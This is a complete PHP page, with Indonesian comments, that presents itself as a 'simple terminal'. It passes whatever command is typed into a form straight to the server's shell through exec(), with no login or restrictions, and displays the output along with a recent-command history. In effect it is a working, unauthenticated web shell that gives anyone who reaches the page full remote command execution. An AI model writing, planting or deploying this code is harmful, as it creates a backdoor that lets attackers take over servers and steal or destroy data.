<?php
session_start();
define('MAX_HISTORY', 10);

// Inisialisasi array penyimpanan riwayat command
if (!isset($_SESSION['cmd_history'])) {
    $_SESSION['cmd_history'] = [];
}

$command_output = '';

// Jika user mengirim form perintah
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    if ($cmd !== '') {
        // Jika history sudah mencapai batas, buang perintah terlama
        if (count($_SESSION['cmd_history']) >= MAX_HISTORY) {
            array_shift($_SESSION['cmd_history']);
        }
        // Tambahkan perintah baru ke riwayat
        $_SESSION['cmd_history'][] = $cmd;

        // Eksekusi perintah
        $o = [];
        $r = 0;
        // Ganti 'exec' dengan 'shell_exec' jika Anda mau langsung dapat string hasil
        @exec($cmd, $o, $r);
        $command_output = ($r === 0)
            ? implode("\n", $o)
            : "[ERROR:$r]\n" . implode("\n", $o);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Terminal Sederhana</title>
    <style>
        body { background: #111; color: #eee; font-family: sans-serif; }
        .terminal-container { max-width: 800px; margin: 0 auto; padding: 1em; }
        input[type="text"] {
            width: 70%;
            padding: 6px;
            background: #222;
            border: 1px solid #555;
            color: #fff;
        }
        input[type="submit"] {
            padding: 6px 12px;
            background: #f70;
            border: none;
            cursor: pointer;
            color: #000;
        }
        ul { list-style: none; padding-left: 0; }
        ul li { background: #222; margin: 4px 0; padding: 4px; }
        pre {
            background: #000;
            color: #0f0;
            padding: 1em;
            overflow: auto;
        }
    </style>
</head>
<body>
<div class="terminal-container">
    <h2>Terminal Sederhana</h2>
    <form method="post" action="">
        <label for="cmd">Perintah: </label>
        <input type="text" name="cmd" id="cmd" placeholder="Masukkan perintah (contoh: ls -la / dir)">
        <input type="submit" value="Run">
    </form>

    <h3>Riwayat Perintah:</h3>
    <ul>
    <?php
    // Tampilkan riwayat perintah (dibalik supaya yg terbaru di atas)
    foreach (array_reverse($_SESSION['cmd_history']) as $h) {
        echo "<li>" . htmlspecialchars($h, ENT_QUOTES, 'UTF-8') . "</li>";
    }
    ?>
    </ul>

    <h3>Hasil Eksekusi:</h3>
    <pre><?php echo htmlspecialchars($command_output, ENT_QUOTES, 'UTF-8'); ?></pre>
</div>
</body>
</html>
